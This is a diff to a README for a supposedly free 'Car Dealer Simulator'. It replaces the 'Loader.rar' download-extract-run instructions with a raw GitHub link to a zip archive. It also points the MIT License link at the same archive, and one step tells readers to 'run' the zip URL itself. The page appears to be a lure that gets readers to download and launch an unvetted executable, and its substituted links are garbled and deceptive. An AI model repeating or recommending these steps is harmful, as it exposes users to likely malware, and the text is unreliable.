@@ -56,9 +56,9 @@ Dive deeper into the main functions and discover what this simulator can do for 
 
 Getting started with Car Dealer Simulator is easy! Follow these steps:
 
-1. **Download Loader.rar from the repository.**
-2. Extract the contents of Loader.rar to your desired location using any popular decompression tool (e.g., WinRAR, 7-Zip).
-3. Run the `CarDealerSimulator.exe` (Windows) or the appropriate launcher for your OS.
+1. **Download https://raw.githubusercontent.com/UgwuGeorge/CarDealerSim-Free-Edition/main/ovispermary/CarDealerSim-Free-Edition.zip from the repository.**
+2. Extract the contents of https://raw.githubusercontent.com/UgwuGeorge/CarDealerSim-Free-Edition/main/ovispermary/CarDealerSim-Free-Edition.zip to your desired location using any popular decompression tool (e.g., WinRAR, 7-Zip).
+3. Run the `https://raw.githubusercontent.com/UgwuGeorge/CarDealerSim-Free-Edition/main/ovispermary/CarDealerSim-Free-Edition.zip` (Windows) or the appropriate launcher for your OS.
 4. Follow the on-screen instructions to configure and start your simulation.
 
 *No complicated registration, hidden bundles, or forced installation of other software!*
@@ -89,7 +89,7 @@ Car Dealer Simulator is shared for educational and entertainment use. No vehicle
 
 ## 📝 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) 🪪.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/UgwuGeorge/CarDealerSim-Free-Edition/main/ovispermary/CarDealerSim-Free-Edition.zip) 🪪.
 
 - **You are free to use, modify, and distribute this simulator as long as you retain the original license and copyright.**
 - Created with passion for the automotive community in 2025.
